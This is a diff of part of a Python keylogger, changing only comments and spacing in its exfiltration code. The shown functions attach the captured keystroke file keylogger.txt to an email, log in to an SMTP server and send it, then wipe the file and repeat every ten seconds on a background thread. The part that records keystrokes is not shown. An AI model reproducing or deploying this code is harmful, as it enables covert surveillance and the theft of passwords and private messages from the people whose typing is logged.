@@ -79,21 +79,19 @@ def send_email(sender_email, recipient_email, subject, smtp_server, smtp_port, l
             body = file.read()
         message.attach(MIMEText(body, 'plain'))
 
-        # Open the keylogger.txt file in binary mode to attach it
+        # Open the keylogger.txt file in binary mode and attach to email
         with open('./keylogger.txt', 'rb') as attachment:
             part = MIMEBase('application', 'octet-stream')
-            part.set_payload(attachment.read())  # Read the file
-            encoders.encode_base64(part)  # Encode the attachment in base64
-
-            # Add the header to specify the attachment filename
+            part.set_payload(attachment.read())
+            encoders.encode_base64(part)
             part.add_header('Content-Disposition', 'attachment', filename='keylogger.txt')
-            message.attach(part)  # Attach the file to the message
+            message.attach(part)
 
-        # Connect to the SMTP server
+        # Connect to the SMTP server and send email
         with smtplib.SMTP(smtp_server, smtp_port) as server:
-            server.starttls()  # Upgrade the connection to secure
-            server.login(login, password)  # Log in to the server
-            server.send_message(message)  # Send the email
+            server.starttls()
+            server.login(login, password)
+            server.send_message(message)
             print("Email sent successfully.")
 
     except Exception as e:
@@ -115,7 +113,9 @@ def periodic_email():
         # Clear the contents of keylogger.txt
         with open("keylogger.txt", "w"):
             pass
-        time.sleep(10)  # Sleep for 10 seconds before sending the next email
+        
+        # Sleep for 10 seconds before sending the next email
+        time.sleep(10)
 
 # Start the periodic email thread, which will exit when the program exits
 email_thread = threading.Thread(target=periodic_email)
